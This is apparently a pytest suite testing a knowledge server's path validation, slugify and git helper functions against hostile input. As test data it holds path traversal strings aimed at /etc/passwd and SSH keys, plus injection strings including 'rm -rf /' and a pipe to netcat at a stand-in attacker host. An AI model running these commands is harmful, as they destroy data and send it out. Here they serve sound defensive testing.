#!/usr/bin/env python3
"""
Test suite for utils.py - security and utility functions
"""

import os
import subprocess
import tempfile
from pathlib import Path

import pytest

from knowledge_mcp.utils import (
    git_command,
    initialize_storage,
    slugify,
    validate_path,
)


class TestPathValidation:
    """Test path validation security function."""

    def test_path_traversal_prevention(self):
        """Test that path traversal attacks are prevented."""

        base_dir = "/safe/directory"

        # Various path traversal attempts
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "projects/../../../etc/passwd",
            "./../../sensitive",
            "projects/test/../../../../../../etc/passwd",
            "projects/test/../../../.ssh/id_rsa",
            "/absolute/path/outside",
            "C:\\Windows\\System32",
        ]

        for path in dangerous_paths:
            with pytest.raises(
                ValueError,
                match="Invalid path|Access denied|Absolute paths not allowed|Drive letters not allowed|Backslashes not allowed",
            ):
                validate_path(base_dir, path)

    def test_valid_paths(self):
        """Test that valid paths are allowed."""

        with tempfile.TemporaryDirectory() as base_dir:
            valid_paths = [
                "projects/my-project/main",
                "projects/test/knowledge/file",
                "test",
                "subdirectory/file.txt",
            ]

            for path in valid_paths:
                result = validate_path(base_dir, path)
                # Handle macOS /var vs /private/var symlink issue
                result_path = Path(result).resolve()
                base_path = Path(base_dir).resolve()
                assert str(result_path).startswith(str(base_path))
                assert ".." not in result

    def test_symlink_prevention(self):
        """Test that symlinks outside base directory are prevented."""

        with tempfile.TemporaryDirectory() as base_dir:
            with tempfile.TemporaryDirectory() as outside_dir:
                # Create a file outside
                outside_file = os.path.join(outside_dir, "secret.txt")
                Path(outside_file).write_text("secret data")

                # Create symlink inside base_dir pointing outside
                link_path = os.path.join(base_dir, "link_to_secret")
                os.symlink(outside_file, link_path)

                # Should raise error when trying to access symlink
                with pytest.raises(ValueError):
                    validate_path(base_dir, "link_to_secret")

    def test_none_and_empty_paths(self):
        """Test handling of None and empty paths."""

        base_dir = "/safe/directory"

        with pytest.raises(ValueError):
            validate_path(base_dir, "")

        with pytest.raises(ValueError):
            validate_path(base_dir, None)


class TestFilenameSlugification:
    """Test filename slugification for security."""

    def test_special_characters_removal(self):
        """Test removal of special characters."""

        test_cases = [
            (
                "file<script>alert()</script>",
                "file-script-alert-_script",
            ),  # / becomes _, < > ( ) become -
            ("file|pipe&chain;command", "file-pipe-chain-command"),
            ("file@#$%^&*()", "file"),
            ("hello world", "hello-world"),
            ("UPPERCASE", "uppercase"),
            ("multiple   spaces", "multiple-spaces"),
            ("--leading-dashes", "leading-dashes"),
            ("trailing-dashes--", "trailing-dashes"),
        ]

        for input_name, expected in test_cases:
            assert slugify(input_name) == expected

    def test_unicode_transliteration(self):
        """Test unicode character handling."""

        test_cases = [
            ("файл", "fail"),  # Cyrillic
            ("文件", "wen-jian"),  # Chinese
            ("café", "cafe"),  # Accented
            ("naïve", "naive"),  # Diaeresis
            ("日本語", "ri-ben-yu"),  # Japanese
        ]

        for input_name, expected in test_cases:
            assert slugify(input_name) == expected

    def test_path_traversal_in_filename(self):
        """Test that path traversal attempts in filenames are sanitized."""

        test_cases = [
            ("../../../etc/passwd", "etc_passwd"),
            ("..\\..\\windows\\system32", "windows_system32"),
            ("file/../secret", "file_secret"),
            ("./hidden/./file", "hidden_file"),
        ]

        for input_name, expected in test_cases:
            result = slugify(input_name)
            # Path separators should be removed/replaced
            assert "/" not in result
            assert "\\" not in result
            # Check specific expected result
            assert result == expected

    def test_empty_and_whitespace_handling(self):
        """Test handling of empty and whitespace-only filenames."""

        test_cases = [
            ("", "untitled"),
            ("   ", "untitled"),
            ("\t\n", "untitled"),
            (".", "untitled"),
            ("..", "untitled"),  # ".." is removed, leaving empty string
        ]

        for input_name, expected in test_cases:
            assert slugify(input_name) == expected

    def test_windows_reserved_names(self):
        """Test handling of Windows reserved filenames."""

        reserved = ["CON", "PRN", "AUX", "NUL", "COM1", "LPT1"]

        for name in reserved:
            result = slugify(name)
            assert result == name.lower()

    def test_extension_handling(self):
        """Test proper handling of file extensions."""

        test_cases = [
            ("file.txt", "file-txt"),
            ("file", "file"),  # No extension added
            ("file.MD", "file-md"),  # Lowercase
            ("file.tar.gz", "file-tar-gz"),  # All dots become hyphens
            ("file.", "file"),  # Trailing dot removed
        ]

        for input_name, expected in test_cases:
            assert slugify(input_name) == expected


class TestGitHelpers:
    """Test git command execution helpers."""

    def test_git_command_isolation(self):
        """Test that git commands use isolated credentials."""

        with tempfile.TemporaryDirectory() as temp_dir:
            repo_path = Path(temp_dir)

            # Initialize repo first
            subprocess.run(["git", "init"], cwd=repo_path, capture_output=True)

            # Test config command
            stdout, stderr = git_command(repo_path, "config", "--list")

            # Should contain our isolated credentials
            assert "user.name=Knowledge MCP Server" in stdout
            assert "user.email=knowledge-mcp@localhost" in stdout

    def test_git_command_error_handling(self):
        """Test git command error handling."""

        with tempfile.TemporaryDirectory() as temp_dir:
            repo_path = Path(temp_dir)

            # Try command on non-git directory
            with pytest.raises(subprocess.CalledProcessError):
                git_command(repo_path, "status")

    def test_git_command_injection_prevention(self):
        """Test that command injection is prevented."""

        with tempfile.TemporaryDirectory() as temp_dir:
            repo_path = Path(temp_dir)
            subprocess.run(["git", "init"], cwd=repo_path, capture_output=True)

            # Attempt command injection
            dangerous_args = [
                "status; rm -rf /",
                "status && echo hacked",
                "status | nc attacker.com 1234",
            ]

            for arg in dangerous_args:
                # Should either fail or treat as literal argument
                try:
                    stdout, stderr = git_command(repo_path, arg)
                    # If it doesn't fail, the dangerous part should be treated as literal
                    assert "rm -rf" not in stdout
                    assert "hacked" not in stdout
                    assert "nc attacker" not in stdout
                except subprocess.CalledProcessError:
                    # Expected for invalid git commands
                    pass


class TestStorageInitialization:
    """Test storage initialization functions."""

    def test_initialize_new_storage(self):
        """Test initializing a new storage directory."""

        with tempfile.TemporaryDirectory() as temp_dir:
            storage_path = Path(temp_dir) / "test_storage"

            initialize_storage(storage_path)

            # Check directory exists
            assert storage_path.exists()
            assert storage_path.is_dir()

            # Check git repo initialized
            assert (storage_path / ".git").exists()

            # Check initial commit exists
            result = subprocess.run(
                ["git", "log", "--oneline"],
                cwd=storage_path,
                capture_output=True,
                text=True,
            )
            assert "Initial commit" in result.stdout

    def test_initialize_existing_storage(self):
        """Test initializing already existing storage."""

        with tempfile.TemporaryDirectory() as temp_dir:
            storage_path = Path(temp_dir)

            # Pre-create directory with git
            subprocess.run(["git", "init"], cwd=storage_path)

            # Create a file
            (storage_path / "existing.txt").write_text("existing content")

            # Initialize should not fail or destroy existing content
            initialize_storage(storage_path)

            assert (storage_path / "existing.txt").exists()
            assert (storage_path / "existing.txt").read_text() == "existing content"

    def test_initialize_permission_error(self):
        """Test handling of permission errors during initialization."""

        if os.name == "posix":  # Unix-like systems only
            with tempfile.TemporaryDirectory() as temp_dir:
                storage_path = Path(temp_dir) / "no_permission"
                storage_path.mkdir()

                # Remove write permission
                os.chmod(storage_path, 0o555)

                try:
                    with pytest.raises(PermissionError):
                        initialize_storage(storage_path / "subdir")
                finally:
                    # Restore permission for cleanup
                    os.chmod(storage_path, 0o755)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
